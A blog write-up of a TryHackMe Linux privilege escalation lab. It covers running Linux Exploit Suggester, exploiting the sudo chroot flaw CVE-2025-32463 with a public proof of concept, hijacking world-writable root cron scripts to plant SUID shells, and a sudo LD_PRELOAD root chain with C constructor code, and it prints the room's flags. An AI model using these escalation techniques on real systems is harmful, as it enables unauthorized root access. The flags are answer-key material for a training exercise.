---
title: "TryHackMe Linux Privilege Escalation: Automation Walkthrough"
date: 2026-09-21T23:50:00+05:30
lastmod: 2026-09-21T23:50:00+05:30
author: Animesh Roy
avatar: /img/avatar.jpeg
authorlink: https://anir0y.in
featureimage: img/thm-linprivauto/00-thumbnail.png

categories:
  - TryHackMe

tags:
  - tryhackme
  - thm
  - rooms
  - Jr Penetration Tester
  - Privilege Escalation
  - Linux
  - LinEnum
  - pspy
  - LD_PRELOAD
  - sudo
  - CVE-2025-32463

draft: false
description: "TryHackMe Linux Privilege Escalation Automation walkthrough: LES, exploiting CVE-2025-32463 sudo-chwoot, pspy, and a sudo LD_PRELOAD root chain."
---

| <script src="https://tryhackme.com/badge/434937"></script>| <a class="twitter-follow-button" href="https://twitter.com/anir0y" data-size="large"> Follow @anir0y<a>|
|---|---|
|Linux Privilege Escalation: Automation |![Linux Privilege Escalation: Automation room icon](https://cdn-images.tryhackme.com/room-icons/6989b1062386d3517f652edd-1772788469674)|

Linux Privilege Escalation: Automation is the fourth room in TryHackMe's Privilege Escalation
module, after [Enumeration](/post/thm-room-linprivenum/) and
[Basics](/post/thm-room-linprivbasics/). Where Basics made you exploit six manually-found vectors
one at a time, Automation is about tooling: run an enumeration script instead of five separate
commands, then chain what it finds into an actual exploit, watch pspy catch what static scanners
miss, and finally combine both worlds in one lab where you pivot user-to-user before rooting.

The room is Premium and, like the rest of the module, deploys a fresh lab machine per task with its
own `john:john` SSH login. I drove every box from the room's own AttackBox (this Mac's THM tunnel had
no working route to the lab subnet this session, so the browser-based AttackBox terminal did the
work throughout).

## Task 2: Automated Enumeration Tools

Linux Exploit Suggester (LES) sits ready in `john`'s home directory. One run against the target:

```bash
  # bash linux-exploit-suggester/linux-exploit-suggester.sh
Possible Exploits:

[+] [CVE-2025-32463] sudo-chwoot
    Details: https://www.stratascale.com/resource/cve-2025-32463-sudo-chroot-elevation-of-privilege/
    Tags: ubuntu=24.04.1,fedora=41
    Download URL: https://github.com/mirchr/CVE-2025-32463-sudo-chwoot/archive/refs/heads/main.zip

[+] [CVE-2022-2586] nft_object UAF
[+] [CVE-2021-4034] PwnKit
[+] [CVE-2021-3156] sudo Baron Samedit
...
```

**CVE-2025-32463** is the first entry LES lists as a Possible Exploit, and the target's own `sudo -V`
confirms `Sudo version 1.9.15p5`, vulnerable.

## Task 3: Privilege Escalation: Public Exploits

The target had no outbound internet (the room's own MOTD banner even admits it: `Failed to connect
to changelogs.ubuntu.com`), so downloading the exploit had to happen on the AttackBox, which does
have internet, then get pushed to the target over SCP:

```bash
  # on the AttackBox (has internet)
wget -q https://github.com/mirchr/CVE-2025-32463-sudo-chwoot/archive/refs/heads/main.zip -O exp.zip
unzip -q exp.zip
scp CVE-2025-32463-sudo-chwoot-main/sudo-chwoot.sh john@<target>:/tmp/
```

CVE-2025-32463 abuses `sudo --chroot`: sudo lets an unprivileged user specify a fake root directory
before running a command, and while still root it reads that fake root's own `/etc/nsswitch.conf` to
resolve users. glibc's NSS loader treats a service name containing a slash as a literal path to a
shared object, resolved *inside* the new chroot, so a crafted `nsswitch.conf` pointing `passwd:` at
an attacker-controlled `.so` gets that library `dlopen()`'d as root before sudo drops privileges. The
official PoC's setup script does exactly that:

```bash
mkdir -p woot/etc libnss_
echo "passwd: /woot1337" > woot/etc/nsswitch.conf
gcc -shared -fPIC -Wl,-init,woot -o libnss_/woot1337.so.2 woot1337.c
sudo -R woot woot
```

```bash
  # bash /tmp/sudo-chwoot.sh
woot!
root@public-exploit:/# whoami; id; cat /root/flag.txt
root
uid=0(root) gid=0(root) groups=0(root),1001(john)
THM{splo1ts-r-public}
```

**Answer format gotcha**: the flag mask was `***{****************}`, 16 characters inside the
braces. `sploits-r-public` (with a letter i) is only 15 once you count it out, and doesn't match at
all; the room spells it `splo1ts` with a leetspeak digit `1`, not the letter, which is the only
reading that actually fits the mask length. Read the flag character by character before assuming a
room typo.

{{< ad >}}

## Task 4: pspy: Unprivileged Process Monitoring

Static tools like LES only see a snapshot; short-lived cron jobs can start and exit inside the gap
between two scans. `pspy64` sits pre-staged in `john`'s home directory again, and this time the fresh
lab machine's cron fires inside seconds of starting it:

```bash
  # ./pspy64 -pf
2026/09/21 15:45:42 CMD: UID=0  PID=2219  | /bin/bash /var/local/syslog-backup.sh
2026/09/21 15:46:02 CMD: UID=0  PID=2248  | /bin/bash /var/local/syslog-backup.sh
```

```bash
  # ls -la /var/local/syslog-backup.sh
-rwxrwxrwx 1 root staff 68 Jun 28 09:10 /var/local/syslog-backup.sh
#!/bin/bash
tar -czf "/var/backup/syslog.tar.gz" "/var/log/syslog"
```

World-writable, owned by root, run by root every ten seconds or so. Overwrite it and wait for the
next tick:

```bash
cat > /var/local/syslog-backup.sh <<'EOF'
#!/bin/bash
cp /bin/bash /tmp/rootbash
chmod 4755 /tmp/rootbash
EOF
```

```bash
  # /tmp/rootbash -p -c 'id; cat /root/flag.txt'
uid=1001(john) gid=1001(john) euid=0(root) groups=1001(john)
THM{getting-root-with-pspy}
```

**/var/local/syslog-backup.sh** and **THM{getting-root-with-pspy}**.

## Task 5: Challenge

One lab machine, two flags: pivot `john` to `frank`, then `frank` to root. `sudo -l` for `john`
returns nothing usable, and `find -perm -4000` / `getcap -r /` turn up only the standard Debian set.
`/home/frank` itself is world-readable, though, and inside it `/opt/scripts/backup.sh` (owned by
frank, run by a frank-owned cron, world-writable) is the same pattern as Task 4 one privilege level
down:

```bash
  # ls -la /opt/scripts/
-rwxrwxrwx 1 frank frank 89 Mar 12 2026 backup.sh
#!/bin/bash
tar czf "/tmp/backup-$(date +%Y%m%d).tar.gz" "/home/frank/Documents" 2>/dev/null
```

```bash
cat > /opt/scripts/backup.sh <<'EOF'
#!/bin/bash
cp /bin/bash /tmp/frankbash
chmod 4755 /tmp/frankbash
EOF
```

```bash
  # /tmp/frankbash -p -c 'id; cat /home/frank/flag.txt'
euid=1002(frank) groups=1001(john)
THM{Frank_Pwned_Privesc}
```

**THM{Frank_Pwned_Privesc}** and now frank for the root half. `sudo -l` as frank is the real
misconfiguration this task is built around:

```bash
  # sudo -l
Matching Defaults entries for frank on challenge:
    env_reset, mail_badpass,
    secure_path=...,
    use_pty, env_keep+=LD_PRELOAD
User frank may run the following commands on challenge:
    (root) NOPASSWD: /usr/bin/id
```

`env_keep+=LD_PRELOAD` combined with a NOPASSWD command is the textbook `sudo` LD_PRELOAD privesc: a
shared library with a constructor gets `dlopen()`'d into the target binary before it runs, and if
that binary runs as root, so does the constructor. First attempt used the classic PoC almost
verbatim, built in `/tmp`:

```c
void woot(void) {
    unsetenv("LD_PRELOAD");
    setuid(0); setgid(0);
    system("cp /bin/bash /tmp/rootbash2; chmod 4755 /tmp/rootbash2");
}
```

```bash
gcc -shared -fPIC -Wl,-init,woot -o /tmp/evil.so /tmp/evil.c
LD_PRELOAD=/tmp/evil.so sudo /usr/bin/id
```

This ran clean, `id` printed normally as root, and `/tmp/rootbash2` never appeared. **Two real
mistakes here, one costly.** The first: my initial test library skipped `unsetenv("LD_PRELOAD")`,
and its constructor's own `system()` call inherited the same `LD_PRELOAD` into every child shell it
spawned, which loaded the library again, which spawned another shell, forever: a self-inflicted
fork bomb that exhausted the target's process table and needed the lab machine terminated and
restarted to recover. Lesson: any constructor that itself forks a child process must strip
`LD_PRELOAD` from its own environment first, or the exploit becomes a denial of service against
your own target.

The second, quieter mistake is why the *fixed* version still silently failed: the library lived in
`/tmp`, which is world-writable with the sticky bit set. glibc's dynamic loader treats that as an
untrusted location and will not honor `LD_PRELOAD` pointing into it once any part of the exec chain
involves a real privilege change, even though `sudo`'s own `env_keep` happily passed the variable
through. A definitive test confirmed it: a library whose constructor calls `_exit(7)` immediately
exits with code 7 and prints nothing when run directly, but ran through `sudo id` it produced full
normal output and exit code 0 every time, proof the library was never actually loaded, regardless of
three different constructor styles tried.

Moving the same library to frank's own home directory (owned by frank, not world-writable) was the
fix:

```bash
cp /tmp/x.so /home/frank/x.so
chmod 755 /home/frank/x.so
LD_PRELOAD=/home/frank/x.so sudo /usr/bin/id
```

```bash
  # ls -la /tmp/rootbash3
-rwsr-xr-x 1 root root 1446024 Sep 21 18:15 /tmp/rootbash3
  # /tmp/rootbash3 -p -c 'id; cat /root/flag.txt'
uid=1001(john) gid=1001(john) euid=0(root) groups=1001(john)
THM{Priv_Ch@l_D0ne}
```

**THM{Priv_Ch@l_D0ne}**.

Two takeaways worth keeping. First, `env_keep+=LD_PRELOAD` in `sudo -l` is not automatically a
working exploit: glibc's own secure-loading rules can silently defeat it depending on *where* the
library sits, so confirm the primitive with something unmissable (an immediate `_exit()` with a
distinct return code) before trusting silence as failure. Second, any LD_PRELOAD constructor that
calls `system()` or `exec`s a child must `unsetenv("LD_PRELOAD")` as its first line, full stop. The
one time I skipped it, the exploit turned into a fork bomb against the lab machine instead of a root
shell.

Room solved 100%: 6 tasks, 9 answers.
